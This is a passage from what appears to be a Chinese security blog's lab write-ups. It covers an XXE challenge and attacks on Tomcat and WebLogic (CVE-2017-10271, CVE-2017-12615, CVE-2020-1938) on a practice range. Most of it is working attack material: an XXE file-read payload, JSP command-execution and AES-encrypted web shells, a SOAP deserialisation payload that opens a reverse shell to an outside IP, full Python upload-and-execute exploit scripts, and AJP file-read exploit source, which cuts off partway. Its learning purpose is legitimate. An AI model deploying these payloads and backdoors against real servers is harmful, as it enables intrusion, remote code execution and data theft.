charset=utf-8&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;PD9waHAKCiRVU0VSTkFNRSA9ICdhZG1pbic7IC8v6LSm5Y+3CiRQQVNTV09SRCA9ICdhZG1pbic7IC8v5a+G56CBCiRyZXN1bHQgPSBudWxsOwoKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7Cgp0cnl7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLCBMSUJYTUxfTk9FTlQgfCBMSUJYTUxfRFRETE9BRCk7CgkkY3JlZHMgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCgkkdXNlcm5hbWUgPSAkY3JlZHMtPnVzZXJuYW1lOwoJJHBhc3N3b3JkID0gJGNyZWRzLT5wYXNzd29yZDsKCglpZigkdXNlcm5hbWUgPT0gJFVTRVJOQU1FICYmICRwYXNzd29yZCA9PSAkUEFTU1dPUkQpewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDEsJHVzZXJuYW1lKTsKCX1lbHNlewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDAsJHVzZXJuYW1lKTsKCX0JCn1jYXRjaChFeGNlcHRpb24gJGUpewoJJHJlc3VsdCA9IHNwcmludGYoIjxyZXN1bHQ+PGNvZGU+JWQ8L2NvZGU+PG1zZz4lczwvbXNnPjwvcmVzdWx0PiIsMywkZS0+Z2V0TWVzc2FnZSgpKTsKfQoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCcpOwplY2hvICRyZXN1bHQ7Cj8+&lt;/msg&gt;&lt;/result&gt;\n&lt;?php$USERNAME = &#x27;admin&#x27;; //账号$PASSWORD = &#x27;admin&#x27;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);try&#123;\t$dom = new DOMDocument();\t$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\t$creds = simplexml_import_dom($dom);\t$username = $creds-&gt;username;\t$password = $creds-&gt;password;\tif($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;\t\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);\t&#125;else&#123;\t\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);\t&#125;\t&#125;catch(Exception $e)&#123;\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);echo $result;?&gt;\n好吧，只能读取文件，可笔者需要一个查看目录的方法定位flag的位置……回去审一下题，是我唐突了，赤果果地提供路劲：&#x2F;flag\nPOST /doLogin.php HTTP/1.1Host: www.whalwl.work:8016User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/xml, text/xml, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xml;charset=utf-8X-Requested-With: XMLHttpRequestReferer: http://www.whalwl.work:8016/Content-Length: 195DNT: 1Connection: close&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [\t&lt;!ENTITY tumei SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;tumei;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\nHTTP/1.1 200 OKDate: Wed, 12 Jan 2022 16:20:19 GMTServer: Apache/2.4.10 (Debian) PHP/5.3.29X-Powered-By: PHP/5.3.29Vary: Accept-EncodingContent-Length: 94Connection: closeContent-Type: text/html; charset=utf-8&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;ZmxhZ3tkOTdhYTY5YjAzNGQ2YjlhZjc0MmJkM2M2M2QxNWYwOX0=&lt;/msg&gt;&lt;/result&gt;\n可以直接用firl:&#x2F;&#x2F;协议，省个解码的步骤\nflag&#123;d97aa69b034d6b9af742bd3c63d15f09&#125;\n\n后记\n太冷了，想着明早再瞅瞅，结果还是继续了，幸运的是拿下了。有些憨，居然审题不清，阔以，又找到一个缺点。\n\n","categories":["靶场"],"tags":["安鸾","XXE"]},{"title":"安鸾之中间件系列","url":"/article/c199ed5c.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io，转载请注明出处！\n\n0x00 tomcat8弱口令0o00 题目提示tomcat8弱口令题目URL：http://106.15.50.112:18081提示：flag在网站根目录下！\n\n0o01 测试过程\n随便找篇文章查看，访问：http://106.15.50.112:18081/manager/html。\n\n弹窗输入账密：tomcat/tomcat\n\njsp 代码\n&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=GBK&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;        &lt;title&gt;一句话木马&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;%        if (&quot;admin&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123;            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();            int len = -1;            byte[] bytes = new byte[4092];            out.print(&quot;&lt;pre&gt;&quot;);            while ((len = input.read(bytes)) != -1) &#123;                out.println(new String(bytes, &quot;GBK&quot;));            &#125;            out.print(&quot;&lt;/pre&gt;&quot;);        &#125;    %&gt;    &lt;/body&gt;&lt;/html&gt;\n\n制作 war 包，jsp文件压缩成 zip 文件，改后缀为 war。上传站点。\n\n\n\n\n部分命令使用。// 看不到 flag 相关文件http://106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=ls// 查看当前位置：/usr/local/tomcathttp://106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=pwd// 不懂 tomcat，直接查找包含 flag 的文件http://106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=find%20/%20-name%20*flag*// 拿 flag：flag&#123;828a7a1a2c4bdc5b287f0d0fe72cf0ff&#125;http://106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=cat%20/usr/local/tomcat/webapps/ROOT/this_flag_2c4bdc5b287f0d0f.txt\n\n\n0o02 Tomcat 目录结构bin-----存放Tomcat的脚本文件，例如启动、关闭conf----Tomcat的配置文件，例如server.xml和web.xmllib-----存放Tomcat运行需要的库文件（JAR包）logs----存放Tomcat执行时的LOG文件temp----存放Tomcat运行时所产生的临时文件webapps-Web发布目录，默认情况下把Web应用文件放于此目录work----存放jsp编译后产生的class文件里面一些重要的文件，需要了解其作用：server.xml：配置tomcat启动的端口号、host主机、Context等web.xml文件：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlettomcat-users.xml：tomcat的用户密码与权限。\n\n0x01 Weblogic弱口令&amp;反序列化0o00 题目提示Weblogic弱口令&amp;反序列化网站URL：http://106.15.50.112:17001提示：本环境存在大量漏洞：控制台弱口令、CVE-2014-4210、CVE-2017-3506、CVE-2017-10271、CVE-2018-2628、CVE-2019-2725、CVE-2020-14882、CVE-2020-14883\n\n0o01 测试过程0b00 控制台弱口令\n直接访问给的链接，404，听说是正常的。看别人复现吧。\n默认后台：http://106.15.50.112:17001/console/login/LoginForm.jsp\n默认口令： weblogic &#x2F; Oracle@123\n部署 –&gt; 安装 –&gt; 上载文件 –&gt; 将部署上载到管理服务器 –&gt; 一直下一步到完成。\n\n\n\n这里是冰蝎马，但还是得 find 。\nflag 路径：/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/this_is_flag7cd3d2fc9cec6901.txt\nflag：flag&#123;04c89e5c3d0d926f510ba9e8ebd513bf&#125;\n\n\n0b01 CVE-2017-10271\nCVE-2017-10271 WebLogic XMLDecoder 反序列化漏洞由 WebLogic Server WLS 组件远程命令执行漏洞，由 wls-wsat.war 触发该漏洞。该漏洞可通过构建 post 请求发送恶意 SOAP（xml） 数据，在解析过程中触发该漏洞。\n如下页面则可能存在，访问链接http://106.15.50.112:17001/wls-wsat/CoordinatorPortType11\n\n\n\n构造请求包。\nGET 请求改为 POST 请求。\n添加请求头：Content-Type: text/xml\n加上大佬构造成反弹 Shell 的 SOAP 数据。\n此处修改反弹 shell 的 bash 命令，改为写马：echo hello whalwl&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/hello.txt；\n服务器路径：/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/hello.txt；\n网页链接：http://106.15.50.112:17001/wls-wsat/hello.txtPOST /wls-wsat/CoordinatorPortType11 HTTP/1.1Host: 106.15.50.112:17001Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: text/xmlUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: type=posttime; Hm_lvt_48042604b3c7a9973810a87540843e34=1656610521,1656611930,1656635518,1656651819; roc_login=a111; roc_secure=ijcS7EUXP2kc7dX6cmEa%252BHh%252BvGfhfh49pUdHpDOaiSo%253D; ADMINCONSOLESESSION=btqbv13Llmvpp98hgvcB01Kdw5rDvXDdsg2VYcXrrPhm081MGkmk!-1333354029; JSESSIONID=lrBMv15Nmclr6jvxvgncp7k0pyGgzl2h1hQN3vRTXzHqycnGq4lm!-1333354029Connection: closeContent-Length: 644&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/120.24.241.34/6868 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;\n\n\n\n直接拿工具扫不香吗\n\n\n0x02 tomcat任意文件写入0o00 题目提示tomcat任意文件写入题目URL：http://106.15.50.112:18082提示：1、Tomcat PUT方法任意写文件漏洞(CVE-2017-12615)2、flag在网站根目录下！\n\n0o01 测试过程0b00 手工测试\n抓取 http://106.15.50.112:18082 界面请求包；\nGET 请求修改为 PUT 请求；\n末尾添加冰蝎 jsp 木马。\nURL：http://106.15.50.112:18082/shell666.jspPUT /shell666.jsp/ HTTP/1.1Host: 106.15.50.112:18082Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: type=posttime; Hm_lvt_48042604b3c7a9973810a87540843e34=1656610521,1656611930,1656635518,1656651819; roc_login=a111; roc_secure=ijcS7EUXP2kc7dX6cmEa%252BHh%252BvGfhfh49pUdHpDOaiSo%253D; ADMINCONSOLESESSION=SyzfvQTGZnSCmkjnnGcV8TJ38v5bGk5m4VkHGmD8gyCDtLTdbQbT!-1333354029; JSESSIONID=CBB3B0EC25E322680209BC5533CDC66EConnection: closeContent-Length: 614&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;\n\n\n0b01 纸机大佬脚本\n纸机大佬写的POC\n\n纸机大佬相关文章：https://www.cnblogs.com/confidant/p/15440233.html\n// 单个，注意网址python3 CVE-2017-15715-POC.py.py -u http://106.15.50.112 -p 18082// 批量python3 CVE-2017-15715-POC.py.py -f IP.txt\n#CVE-2017-12615 POC__author__ = &#x27;纸机&#x27;import requestsimport optparseimport osparse = optparse.OptionParser(usage = &#x27;python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]&#x27;)parse.add_option(&#x27;-u&#x27;,&#x27;--url&#x27;,dest=&#x27;URL&#x27;,help=&#x27;target url&#x27;)parse.add_option(&#x27;-p&#x27;,&#x27;--port&#x27;,dest=&#x27;PORT&#x27;,help=&#x27;target port[default:8080]&#x27;,default=&#x27;8080&#x27;)parse.add_option(&#x27;-f&#x27;,dest=&#x27;FILE&#x27;,help=&#x27;target list&#x27;)options,args = parse.parse_args()#print(options)#验证参数是否完整if (not options.URL or not options.PORT) and not options.FILE:        print(&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]\\n&#x27;)        exit(&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;)filename = &#x27;/hello.jsp&#x27;#测试数据data = &#x27;hello&#x27;#提交PUT请求#resp = requests.post(url1,headers=headers,data=data)#验证文件是否上传成功#response = requests.get(url2)#上传文件def upload(url):  try:    response = requests.put(url+filename+&#x27;/&#x27;,data=data)    return 1  except Exception as e:    print(&quot;[-] &#123;0&#125; 连接失败&quot;.format(url))    return 0def checking(url):  try:    #验证文件是否上传成功    response = requests.get(url+filename)    #print(url+filename)    if response.status_code == 200 and &#x27;hello&#x27; in response.text:      print(&#x27;[+] &#123;0&#125; 存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;.format(url))    else:      print(&#x27;[-] &#123;0&#125; 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;.format(url))  except Exception as e:                #print(e)    print(&quot;[-] &#123;0&#125; 连接失败&quot;.format(url))if options.FILE and os.path.exists(options.FILE):  with open(options.FILE) as f:    urls = f.readlines()    #print(urls)    for url in urls:      url = str(url).replace(&#x27;\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).strip()      if upload(url) == 1:        checking(url)elif options.FILE and not os.path.exists(options.FILE):  print(&#x27;[-] &#123;0&#125; 文件不存在&#x27;.format(options.FILE))else:  #上传链接  url = options.URL+&#x27;:&#x27;+options.PORT  if upload(url) == 1:    checking(url)\n\n纸机大佬写的exp\n#CVE-2017-12615 EXP#python3 CVE-2017-15715-EXP.py.py -u http://106.15.50.112 -p 18082__author__ = &#x27;纸机&#x27;import requestsimport optparseimport timeparse = optparse.OptionParser(usage = &#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;)parse.add_option(&#x27;-u&#x27;,&#x27;--url&#x27;,dest=&#x27;URL&#x27;,help=&#x27;target url&#x27;)parse.add_option(&#x27;-p&#x27;,&#x27;--port&#x27;,dest=&#x27;PORT&#x27;,help=&#x27;target port[default:8080]&#x27;,default=&#x27;8080&#x27;)options,args = parse.parse_args()#验证参数是否完整if not options.URL or not options.PORT:        print(&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\\n&#x27;)        exit(&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;)url = options.URL+&#x27;:&#x27;+options.PORTfilename = &#x27;/backdoor.jsp&#x27;payload = filename+&#x27;?pwd=023&amp;i=&#x27;headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;&#125;#木马data = &#x27;&#x27;&#x27;&lt;%    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1)&#123;            out.println(new String(b));        &#125;        out.print(&quot;&lt;/pre&gt;&quot;);    &#125;%&gt;&#x27;&#x27;&#x27;#上传木马文件def upload(url):  print(&#x27;[*] 目标地址:&#x27;+url)  try:    respond = requests.put(url+filename+&#x27;/&#x27;,headers=headers,data = data)    #print(respond.status_code)    if respond.status_code == 201 or respond.status_code == 204:      #print(&#x27;[*] 目标地址:&#x27;+url)      print(&#x27;[+] 木马上传成功&#x27;)  except Exception as e:    print(&#x27;[-] 上传失败&#x27;)    return 0#命令执行def attack(url,cmd):  try:    respond = requests.get(url+payload+cmd)    if respond.status_code == 200:      print(str(respond.text).replace(&quot;&lt;pre&gt;&quot;,&quot;&quot;).replace(&quot;&lt;/pre&gt;&quot;,&quot;&quot;).strip())  except Exception as e:    print(&#x27;[-] 命令执行错误&#x27;)if upload(url) == 0:        exit()time.sleep(0.5)print(&#x27;输入执行命令(quit退出):&#x27;)while(1):  cmd = input(&#x27;&gt;&gt;&gt;&#x27;)  if(cmd == &#x27;quit&#x27;):    break  attack(url,cmd)\n\n\n0b10其他大佬脚本\n脚本一把梭运行脚本：python3 CVE-2017-12615.py http://106.15.50.112:18082http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=find%20/%20-name%20*flag*或http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=ls%20-R// 拿flag：flag&#123;1835f7ba6689c37d4804bdfdbc4fd70d&#125;http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=cat%20/usr/local/tomcat/webapps/ROOT/this_flag_6689c37d4804bdfd.txt\nimport requestsimport sysimport time &#x27;&#x27;&#x27;Usage:\tpython CVE-2017-12615.py http://127.0.0.1\tshell: http://127.0.0.1/201712615.jsp?pwd=fff&amp;cmd=whoami&#x27;&#x27;&#x27; def attack(url):\tuser_agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;\theaders=&#123;&quot;User-Agent&quot;:user_agent&#125;\tdata=&quot;&quot;&quot;&lt;%    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1)&#123;            out.println(new String(b));        &#125;        out.print(&quot;&lt;/pre&gt;&quot;);    &#125;%&gt;&quot;&quot;&quot;\ttry:\t\trequests.put(url, headers=headers, data=data) \t\ttime.sleep(2) \t\tverify_response = requests.get(url[:-1], headers=headers) \t\tif verify_response.status_code == 200:\t\t\tprint(&#x27;success&#x27;)\t\telse :\t\t\tprint (verify_response.status_code) \texcept :\t\t&quot;error&quot; if __name__ == &#x27;__main__&#x27;:\ttarget_url = sys.argv[1] + &#x27;/201712615.jsp/&#x27; \tattack(target_url)\tprint (&#x27;shell: &#x27; + target_url[:-1]) \n\n\n0o02 CVE-2017-12615\n漏洞概述：运行在 Windows 操作系统的 Tomcat ，启用 HTTP PUT 请求方法（readonly 初始化参数由默认值 true 设置为 false），则攻击者可构造恶意请求包向服务器上传包含任意代码的 JSP 文件。当JSP文件中的恶意代码被服务器执行时，将导致服务器上的数据泄露或获取服务器权限。\n影响范围：Apache Tomcat 7.0.0 - 7.0.79。\n漏洞防护：① 设置 conf&#x2F;webxml 文件的 readOnly 值为 Ture 或注释参数；② 禁用 PUT 方法并重启 tomcat 服务。注：禁用 PUT 方法时，对于依赖 PUT 方法的应用可能会导致业务失效；③ 升级到最新版本；④ 使用WAF产品进行防御。\n注：通过对站点的观察：Apache Tomcat/8.5.19；对 URL 大小写判断，初步判断为 Linux 系统；这是扩大范围了？\n\n0x03 Apache Tomcat AJP 文件包含漏洞0o00 题目提示Apache Tomcat AJP 文件包含漏洞（CVE-2020-1938）题目URL：http://106.15.50.112:18080/whalwl/ajp端口：18009Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。这个漏洞影响全版本默认配置下的 Tomcat（在我们发现此漏洞的时候，确认其影响 Tomcat 9/8/7/6 全版本，而年代过于久远的更早的版本未进行验证），这意味着它在 Tomcat 里已经潜伏了长达十多年的时间。\n\n0o01 测试过程0b000 版本探测\nnmap探测# 18009端口，Apache Tomcat 9.0.30，满足CVE-2020-1938存在环境sudo nmap 106.15.50.112 -p 18080 -sV -sS# 18009端口，探测不出服务，被bansudo nmap 106.15.50.112 -p 18009 -sV -sS# 整合sudo nmap 106.15.50.112 -p 18009,18080 -sV -sS\n\n\n\n报错探测http://106.15.50.112:18080/whalwl/admin\n\n\n0b001 脚本测试\nAjPy验证工具：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi\n通过python脚本利用AJP BUG读取webapp任意目录下文件，以/WEB-INF/web.xml为例\n默认 Python2 环境运行\n???路径有问题???修复了???\n测试读取不存在文件，报错：HTTP Status 500 – Internal Server Error–&gt;确定：路径问题。python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 106.15.50.112 -p 18009 -f WEB-INF/web.xml# 注 # python3的使用# 听说，如下修改 CNVD-2020-10487-Tomcat-Ajp-lfi.py# 测试，没成功# 报错：AttributeError: &#x27;Tomcat&#x27; object has no attribute &#x27;stream&#x27;&#x27;&#x27;&#x27;self.socket.makefile(&quot;rb&quot;, bufsize=0)替换为self.socket.makefile(&quot;rb&quot;, buffering=0)print(&quot;&quot;.join([d.data for d in data]))替换为print(&quot;&quot;.join([d.data.decode() for d in data]))&#x27;&#x27;&#x27;\n\n\n0b010 目录说明# vulhub 漏洞靶机中8080端口的网站根目录/usr/local/tomcat/webapps/ROOT# 搭建靶场# 物理路径：/usr/local/tomcat/webapps/ROOT/test/CVE-2020-19381.png# 网络路径http://192.168.255.130:8080/test/CVE-2020-19381.png# 修复测试，无法修复# 注释 conf/server.xml 中的&lt;Connector port=“8009” protocol=&quot;AJP/1.3&quot;redirectPort=“8443” /&gt;# 报错，排除靶场漏洞已修复Traceback (most recent call last):  File &quot;CNVD-2020-10487-Tomcat-Ajp-lfi.py&quot;, line 295, in &lt;module&gt;    t = Tomcat(args.target, args.port)  File &quot;CNVD-2020-10487-Tomcat-Ajp-lfi.py&quot;, line 261, in __init__    self.socket.connect((target_host, target_port))  File &quot;/usr/lib/python2.7/socket.py&quot;, line 228, in meth    return getattr(self._sock,name)(*args)socket.error: [Errno 111] Connection refused\n\n\n0b011 跨目录问题# 目录扫描命令dirb http://106.15.50.112:18080/# 结果+ http://106.15.50.112:18080/docs (CODE:302|SIZE:0)+ http://106.15.50.112:18080/examples (CODE:302|SIZE:0)+ http://106.15.50.112:18080/host-manager (CODE:302|SIZE:0)+ http://106.15.50.112:18080/manager (CODE:302|SIZE:0)# 又：靶场站点默认路径 http://106.15.50.112:18080/whalwl/# 推测：/usr/local/tomcat/webapps/whalwl# 即：ROOT 目录文件与 whalwl 同级# 又：脚本默认读取 ROOT 目录中文件# 故：若想读取 webapps 其他目录（如 whalwl）下的文件，需要对脚本进行修改，即问题所在# 如下代码已修改# CNVD-2020-10487-Tomcat-Ajp-lfi.py 的 296行：# _,data = t.perform_request(&#x27;/asdf&#x27;,attributes=[# 修改为# _,data = t.perform_request(&#x27;/whalwl/asdf&#x27;,attributes=[  \n#!/usr/bin/env python#CNVD-2020-10487  Tomcat-Ajp lfi#by ydhcuiimport struct# Some references:# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.htmldef pack_string(s):\tif s is None:\t\treturn struct.pack(&quot;&gt;h&quot;, -1)\tl = len(s)\treturn struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#x27;utf8&#x27;), 0)def unpack(stream, fmt):\tsize = struct.calcsize(fmt)\tbuf = stream.read(size)\treturn struct.unpack(fmt, buf)def unpack_string(stream):\tsize, = unpack(stream, &quot;&gt;h&quot;)\tif size == -1: # null string\t\treturn None\tres, = unpack(stream, &quot;%ds&quot; % size)\tstream.read(1) # \\0\treturn resclass NotFoundException(Exception):\tpassclass AjpBodyRequest(object):\t# server == web server, container == servlet\tSERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\tMAX_REQUEST_LENGTH = 8186\tdef __init__(self, data_stream, data_len, data_direction=None):\t\tself.data_stream = data_stream\t\tself.data_len = data_len\t\tself.data_direction = data_direction\tdef serialize(self):\t\tdata = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)\t\tif len(data) == 0:\t\t\treturn struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)\t\telse:\t\t\tres = struct.pack(&quot;&gt;H&quot;, len(data))\t\t\tres += data\t\tif self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:\t\t\theader = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))\t\telse:\t\t\theader = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))\t\treturn header + res\tdef send_and_receive(self, socket, stream):\t\twhile True:\t\t\tdata = self.serialize()\t\t\tsocket.send(data)\t\t\tr = AjpResponse.receive(stream)\t\t\twhile r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:\t\t\t\tr = AjpResponse.receive(stream)\t\t\tif r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:\t\t\t\tbreakclass AjpForwardRequest(object):\t_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)\tREQUEST_METHODS = &#123;&#x27;GET&#x27;: GET, &#x27;POST&#x27;: POST, &#x27;HEAD&#x27;: HEAD, &#x27;OPTIONS&#x27;: OPTIONS, &#x27;PUT&#x27;: PUT, &#x27;DELETE&#x27;: DELETE, &#x27;TRACE&#x27;: TRACE&#125;\t# server == web server, container == servlet\tSERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\tCOMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,\t\t&quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;, &quot;SC_REQ_AUTHORIZATION&quot;,\t\t&quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;, &quot;SC_REQ_COOKIE2&quot;,\t\t&quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;\t]\tATTRIBUTES = [&quot;context&quot;, 